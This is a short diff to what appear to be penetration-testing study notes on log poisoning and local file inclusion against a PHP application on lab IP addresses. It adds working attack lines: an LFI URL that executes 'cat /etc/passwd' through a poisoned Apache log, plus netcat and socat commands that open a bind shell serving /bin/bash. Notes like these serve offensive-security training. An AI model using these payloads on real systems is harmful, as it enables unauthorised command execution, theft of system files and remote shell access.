@@ -97,7 +97,11 @@ This will cause the PHP application to execute:
 With this payload now in the log file, we can attempt local file inclusion (LFI) execution:  
 `http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
 
+Other examples:
+http://192.168.231.52/menu.php?file=/var/log/apache2/access.log&cmd=cat /etc/passwd`
 
+/cmd.php&cmd=nc -nvlp 60000 -e /bin/bash
+socat -d TCP4-LISTEN:60000 EXEC:/bin/bash
 
 
 
